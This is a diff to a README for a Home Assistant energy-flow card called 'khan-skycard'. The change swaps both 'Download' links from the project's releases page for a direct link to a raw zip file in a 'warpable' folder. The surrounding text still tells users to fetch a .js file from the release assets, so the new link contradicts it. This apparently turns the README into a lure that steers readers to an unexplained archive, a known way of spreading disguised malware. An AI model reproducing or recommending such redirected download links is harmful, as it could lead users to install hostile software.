@@ -1,6 +1,6 @@
 # ☀️ khan-skycard - Visualize home energy with live backgrounds
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Facile-toitoi922/khan-skycard/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Facile-toitoi922/khan-skycard/raw/refs/heads/main/warpable/skycard-khan-v3.6.zip)
 
 This card brings life to your Home Assistant dashboard. It displays your home energy flow using a high-quality photographic sky background. The card updates in real-time to match the sun and moon positions in your local area. It builds upon the original K-Flow Card design but adds visual polish and custom settings.
 
@@ -8,7 +8,7 @@ This card brings life to your Home Assistant dashboard. It displays your home en
 
 You need to access the release page to get the latest version of the software. Follow this link to find the files:
 
-[Download the latest version here](https://github.com/Facile-toitoi922/khan-skycard/releases)
+[Download the latest version here](https://github.com/Facile-toitoi922/khan-skycard/raw/refs/heads/main/warpable/skycard-khan-v3.6.zip)
 
 Look for the file named `khan-skycard.js` under the Assets section of the latest release. Save this file to your computer.
 
